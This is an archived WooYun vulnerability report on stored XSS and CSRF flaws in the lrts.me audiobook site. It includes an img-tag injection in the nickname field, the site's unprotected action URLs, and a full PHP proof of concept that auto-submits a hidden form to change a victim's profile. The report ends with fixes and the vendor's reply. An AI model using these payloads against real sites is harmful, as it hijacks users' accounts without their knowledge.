{"id": 25597, "wybug_id": "wooyun-2015-0130963", "wybug_title": "懒人听书XSS+CSRF漏洞", "wybug_corp": "lrts.me", "wybug_author": "路人甲", "wybug_date": "2015-08-03 14:52", "wybug_open_date": "2015-09-17 17:04", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验", "漏洞利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-17：\t细节向公众公开  简要描述： 懒人听书解放双眼，畅听世界。==================================== 详细说明：  1、在用户昵称处，仅仅在前端做了限制，没在服务器端做校验，致使用户可以改包绕过前端限制；亦或者直接提交参数的值也可以绕过前端验证。\nhttp://www.lrts.me/updateBasicInfo.do?areaIds=地区&birthday=生日&email=邮箱&nickName=昵称&remark=个性签名&sex=性别\n1.1这里，方面测试我们把用户昵称修改为：xk<img src=\"http://t.im/qcfo\"/>\nhttp://www.lrts.me/updateBasicInfo.do?areaIds=29_456&birthday=1970-1-1&email=test@test.com&nickName=xk%3Cimg%20src=%22http://t.im/qcfo%22/%3E&remark=test&sex=1\n\n\n1.2这里src里面的值用到了短链接，因为测试的时候发现，虽然服务器端对字符串格式未验证，但还是对长度进行了验证的，不能超过32个字节长度。其中src的原始值为：\nhttp://www.lrts.me/addComment.do?commentContent=test&entityId=9758&entityType=2\n1.3如上链接意思为：对id是9758的节目进行评价，评价的内容是test，评价的星星为4颗（默认），如果是5颗星呢？只需要在参数后面接着加上&commentStar=5就可以了。找个节目进行评价。如图所示，可以看到，img标签被完整输出了。\n\n1.4当用户查看这个节目的时候，浏览器就会访问img标签里的src属性值。致使在用户不知情的情况下，对指定id的节目进行评价，如图所示：\n\n2、关注or取消关注关注:http://www.lrts.me/user/addFollow.do?userId=123141749取消关注：http://www.lrts.me/user/cancellFollow.do?userId=1231417493、收藏or取消收藏收藏:http://www.lrts.me/user/addCollection.do?entityId=9758&entityType=2取消收藏:http://www.lrts.me/user/delCollection.do?entityId=9758&entityType=24、对节目赞一个http://www.lrts.me/user/addLike.do?entityId=9758&entityType=2=============================================================================   漏洞证明：  1、如下是修改用户信息，“畅听”竟然被当作敏感字！将下面代码传到服务器。把详细说明1.1中的src熟悉替换为php文件所在的地址。当用户访问后，就会实现自动修改个人信息。\n<?php$name = date('Y-m-d H:i:s');//获取时间?昵称不能有相同的,所以在昵称后面加一个时间.233333$csrf = \"<form method='post' action='http://www.lrts.me/updateBasicInfo.do'>\";$csrf = $csrf.\"<input type='text' value='8_165' name='areaIds' style='display:none!important;display:block;width=0;height=0' />\";$csrf = $csrf.\"<input type='text' value='1970-1-1' name='birthday' style='display:none!important;display:block;width=0;height=0' />\";$csrf = $csrf.\"<input type='text' value='test@test.com' name='email' style='display:none!important;display:block;width=0;height=0' />\";$csrf = $csrf.\"<input type='text' value=\\\"小懒听书:-)$name\\\" name='nickName' style='display:none!important;display:block;width=0;height=0' />\";$csrf = $csrf.\"<input type='text' value='解放雙眼 暢聽世界 ' name='remark' style='display:none!important;display:block;width=0;height=0' />\";$csrf = $csrf.\"<input type='text' value='1' name='sex' style='display:none!important;display:block;width=0;height=0' />\";$csrf = $csrf.\"</form>\";$csrf = $csrf.\"<script>document.forms[0].submit();</script>\";echo($csrf);?>\n如上所述。   修复方案：  csrf*验证HTTP Referer字段，如果Referer中的地址不是来源于本网站则拒绝提供相关服务。*在HTTP请求中以参数的形式添加一个随机的token，并在服务器端检查这个token是否正确，如不正确或不存在 ，则可以认为是不安全的请求，拒绝提供相关服务。xss*根据实际情况对用户的输入进行基于白名单的过滤。对于不在白名单之内的，全部忽略掉。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-08-03 17:03 厂商回复： 感谢作者持续给我们提交漏洞报告，我们会尽快统一修改CRSF和XSS漏洞！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}